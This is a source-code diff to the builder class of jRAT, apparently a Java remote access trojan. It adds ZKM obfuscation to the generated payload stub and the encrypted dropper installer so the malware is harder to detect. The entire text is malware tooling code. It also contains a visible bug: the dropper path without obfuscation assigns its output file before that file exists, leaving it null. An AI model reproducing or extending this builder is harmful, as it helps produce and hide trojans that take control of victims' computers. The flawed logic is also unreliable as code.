@@ -26,6 +26,7 @@ import pro.jrat.client.extensions.StubPlugin;
 import pro.jrat.client.io.Files;
 import pro.jrat.client.listeners.BuildListener;
 import pro.jrat.client.ui.frames.FrameSummary;
+import pro.jrat.client.utils.ZkmLibUtils;
 import pro.jrat.common.codec.Base64;
 import pro.jrat.common.codec.Hex;
 import pro.jrat.common.crypto.Crypto;
@@ -61,13 +62,24 @@ public class Build {
 		File tempCryptedNotRunnableJar = null;
 
 		try {
+
+			File output;
+
+			if (obfuscate) {
+				output = File.createTempFile(Constants.NAME + "-Builder-Temp", ".jar");
+			} else if (dropper) {
+				output = tempStubCleanJar;
+			} else {
+				output = file;
+			}
+
 			tempStubCleanJar = File.createTempFile(Constants.NAME + "-Builder-Temp" + (new Random()).nextInt(), ".jar");
 			tempCryptedNotRunnableJar = File.createTempFile(Constants.NAME + "-Builder-Installer-Temp" + (new Random()).nextInt(), ".jar");
 			long start = System.currentTimeMillis();
 
 			inputStub = new ZipFile(buildFrom);
 
-			outputStub = new ZipOutputStream(new FileOutputStream(dropper ? tempStubCleanJar : file));
+			outputStub = new ZipOutputStream(new FileOutputStream(output));
 
 			Enumeration<? extends ZipEntry> entries = inputStub.entries();
 			while (entries.hasMoreElements()) {
@@ -179,7 +191,7 @@ public class Build {
 						if (entry.getName().replace("/", ".").replace(".class", "").equals(mainClass)) {
 							plugins[i] = entry.getName().replace("/", ".").replace(".class", "");
 						}
-						
+
 						entry = new ZipEntry(entry.getName());
 
 						try {
@@ -208,13 +220,27 @@ public class Build {
 
 			inputStub.close();
 			outputStub.close();
+			
+			if (obfuscate) {
+				if (dropper) {
+					ZkmLibUtils.obfuscate(output, tempStubCleanJar);
+				} else {
+					ZkmLibUtils.obfuscate(output, file);
+				}
+			}
 
 			if (dropper) {
 				listener.reportProgress(50, "Writing stub into dropper", BuildStatus.INFO);
 				byte[] installerKey = key.getKey();
 				FileCrypter.encrypt(tempStubCleanJar, tempCryptedNotRunnableJar, installerKey);
 
-				inputStub = new ZipFile(Files.getInstaller());
+				if (obfuscate) {
+					File temp = File.createTempFile("jrat-build-temp-obfuscated-installer", ".jar");
+					ZkmLibUtils.obfuscate(Files.getInstaller(), temp);
+					inputStub = new ZipFile(temp);
+				} else {
+					inputStub = new ZipFile(Files.getInstaller());
+				}
 				outputStub = new ZipOutputStream(new FileOutputStream(file));
 
 				entries = inputStub.entries();
